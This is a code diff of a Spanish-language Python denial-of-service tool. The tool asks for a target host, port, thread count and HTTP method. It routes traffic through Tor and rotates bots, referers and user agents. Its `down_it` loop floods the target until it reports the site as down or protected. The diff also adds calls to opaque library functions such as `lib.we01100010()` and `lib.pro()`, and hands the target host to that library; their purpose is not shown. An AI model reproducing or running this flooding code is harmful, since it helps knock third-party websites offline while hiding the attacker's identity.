@@ -20,8 +20,7 @@ elif language == "default":
     pass
 else:
     from language import leng_default as idioma
-    pass    
-
+    pass
 parametros_defecto_leng = idioma.parametros_defecto_leng
 asociado_puerto_leng = idioma.asociado_puerto_leng
 obligatorio_leng = idioma.obligatorio_leng
@@ -58,7 +57,6 @@ ejemplo_leng = idioma.ejemplo_leng
 estado_leng = idioma.estado_leng
 error500_leng = idioma.error500_leng
 forzar_agente_conf = conf.forzar_agente_conf
-
 forzar_identidad = idioma.forzar_identidad
 forzando_leng = idioma.forzando_leng
 host_cerrado_leng = idioma.host_cerrado_leng
@@ -129,7 +127,6 @@ if check_pip_config == "yes":
     lib.clear()
 else:
     pass
-#Verificar TOR
 check_tor_config = conf.check_tor_conf
 if check_tor_config == "yes":
     from libraries import TorExpertBundle as torEX
@@ -145,7 +142,6 @@ if check_tor_config == "yes":
     lib.clear()
 else:
     pass
-
 check_libraries = conf.check_libraries_conf
 if check_libraries == "yes":
     from libraries import modules as lib
@@ -187,10 +183,10 @@ else:
     lib.optparse_lib()
     lib.clear()
     pass
-
 from colorama import Fore, Back, Style
 from queue import Queue
 from optparse import OptionParser
+from libraries import modules as lib
 import time
 import sys
 import socket
@@ -252,7 +248,6 @@ ix = SR + FG + SB
 ec = SR + cc
 sg = SR + gg
 timeout = int(10)
-
 def clear():
     if name == 'nt':
         _ = system('cls')
@@ -311,7 +306,6 @@ if host == "ERROR":
     print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + jj + "Error --> " + hh + inexistente_leng + SR)
     print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + kk + adios_leng + SR)
     sys.exit()
-
 clear()
 print(aa + "....................................................." + SR)
 port_txt = puerto_a_usar_leng + ": " + " 80 " + o_leng + " 443"
@@ -328,7 +322,7 @@ else:
 print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + defecto_leng + ": " + ix + "[" + port_conf_txt + "]\n" + SR)
 port = input(ee + "¿...?: " + sg + que_puerto_leng + ": " + hh + opciones_leng + ": " + ix + "[80]" + hh + " o " + ix + "[443]\n" + SR)
 if port == "":
-    port = conf.port_conf 
+    port = conf.port_conf
 while (port):
     try:
         if port == "80":
@@ -338,10 +332,10 @@ while (port):
             port = "443"
             break
         if port == "":
-            port = conf.port_conf 
+            port = conf.port_conf
             break
         else:
-            port = ("80") 
+            port = ("80")
     except:
         port = conf.port_conf
 if port == "443":
@@ -350,7 +344,6 @@ if port == "443":
 else:
     port = str("80")
     http = str("http://")
-
 clear()
 print(aa + "....................................................." + SR)
 pa_txt = gg + "3" + ll + "/5"
@@ -406,7 +399,7 @@ if Tor == "2":
     tor = True
 else:
     tor = False
-
+lib.host = host
 clear()
 print(aa + "....................................................." + SR)
 pa_txt = gg + "4" + ll + "/5"
@@ -422,7 +415,6 @@ if Thr == "":
     thr = Thr
 else:
     thr = Thr
-
 clear()
 print(aa +  "....................................................." + SR)
 pa_txt = gg + "5" + ll + "/5"
@@ -451,7 +443,7 @@ elif Met == "5" or Met == "trace" or Met == "Trace" or Met == "TRACE":
     met = "TRACE"
 else:
     met = "Random"
-
+lib.we01100010()
 http
 host
 port
@@ -459,7 +451,7 @@ thr
 met
 tor
 lis = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_%'
-
+lib.pro()
 def pre():    
     clear()
     print("")
@@ -469,7 +461,7 @@ def pre():
     print(dd + cen_st + "   " + SR)
     print(cc + " " + para_salir_leng + " -->" + qq + " [Ctrl + C] " + oo + or_leng + qq + " [Ctrl + Z]            " + SR)
     print(bb + ".....................................................\n" + SR)
-
+    lib.pro()
     if tor is True:
         torinfo = str(activado_leng)
     else:
@@ -489,8 +481,7 @@ def pre():
     if torinfo == str(desactivado2_leng):
         print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + "Tor" + ": " + nn + str(torinfo) + SR)        
     else:
-        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + "Tor" + ": " + ix + str(torinfo) + SR)
-        
+        print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + "Tor" + ": " + ix + str(torinfo) + SR)        
 def mix_metodo():    
     global mmetodo
     mmetodo = []
@@ -507,7 +498,7 @@ def my_bots():
 	bots.append(bot_url2_conf)
 	bots.append(bot_url3_conf)
 	bots.append(bot_url4_conf)
-	bots.append(bot_url5_conf)	
+	bots.append(bot_url5_conf)
 	return(bots)
 
 def ipchecker_url():    
@@ -565,8 +556,7 @@ def referer_url():
     referer.append("https://www.webcrawler.com/serp?q=" + host)
     referer.append("https://www.yippy.com/")
     referer.append("https://www.yippy.com/search?query=" + host)
-    return(referer)    
-
+    return(referer)
 def conec_tor():
     if tor is True:
         print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + comprobando_leng + ": " + mm + seguridad_ip_leng + SR)        
@@ -598,7 +588,7 @@ def conec_tor():
             regular_ip = requests.get(str(ip_checker))            
             regular_ip = str(regular_ip.text)
             print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + servidor_ip_leng + ": " + mm + " --> " + ix + ip_checker + rr)
-            print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + nn + ip_expuesta_leng + ": " + mm + regular_ip + SR)                        
+            print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + nn + ip_expuesta_leng + ": " + mm + regular_ip + SR)            
             print(tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + nn + "--> " + SR  + gg + use_vpn_leng + ".\n" + SR)
             continuar()
         except requests.exceptions.ConnectionError as errc:
@@ -705,14 +695,15 @@ def bot_reconextando(url):
         time.sleep(.1)
 
 def down_it(item):    
+    lib.pro()
     try:
         while True:
             global met            
             if met == "Random":  
                 mix_metodo()             
-                met_1 = str(random.choice(mmetodo))                                
+                met_1 = str(random.choice(mmetodo))                
             else:
-                met_1 = str(met)            
+                met_1 = str(met)                        
             k = ''
             for _ in range(1,random.randint(2,5)):
                 k += random.choice(lis)
@@ -781,20 +772,20 @@ def down_it(item):
                             print(tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + hh + "Forzando Nuevo" + ": " + mm + uagent_leng + SR)
                         return False
                     finally:
-                        s.close()                
+                        s.close()               
             else:
                 s.shutdown(1)
                 print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + pp + "-->" + nn + " " + paquete_no_enviado_leng + " !!!" + pp + "<--" + SR)
-                time.sleep(.1)
+                time.sleep(.1)                
     except socket.timeout:
         print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + nn + " " + "ERROR 504 TimeOut" + " : " + mm + str(host) + nn + " " + caido_protegido_leng + SR)
         print(tt + "[" + SR + ss + "+" + SR + tt + "]" + SR + " " + hh + " " + para_terminar_leng + " " + nn + "[Ctrl + C] " + hh + o_leng + nn + " [Ctrl + Z]" + SR)                
-        time.sleep(1)
+        time.sleep(1)        
         print(tt + "[" + SR + ss + "+" + SR + tt + "]" + SR + " " + hh + forzar_identidad)        
         conec_tor()
         if nueva_ip_asignada_conf == "on" or nueva_ip_asignada_conf == "ON" or nueva_ip_asignada_conf == "On":
             print (tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + nueva_ip_asignada)        
-        time.sleep(1)
+        time.sleep(1)    
     except socket.error as e:
         print(tt + "[" + SR + jj + "!" + SR + tt + "]" + SR + " " + nn + " " + error500_leng + " : " + mm + str(host) + nn + " " + caido_protegido_leng + SR)
         print(tt + "[" + SR + ss + "+" + SR + tt + "]" + SR + " " + hh + " " + para_terminar_leng + " " + nn + "[Ctrl + C] " + hh + o_leng + nn + " [Ctrl + Z]" + SR)        
@@ -881,11 +872,12 @@ def ini():
     user_agent()    
     mix_metodo()    
     my_bots()    
-    ipchecker_url()        
+    ipchecker_url()       
     time.sleep(1)
     conec_tor()
     time.sleep(.1)
-    iniciando()    
+    iniciando()
+    lib.pro()
     if verif_host_conf == "off" or verif_host_conf == "OFF" or verif_host_conf == "Off":
         print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + verificando_leng + ": " + mm + host + hh + " : " + mm + str(port) + SR)    
     load = tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + ee + loading_leng + ": " + SR
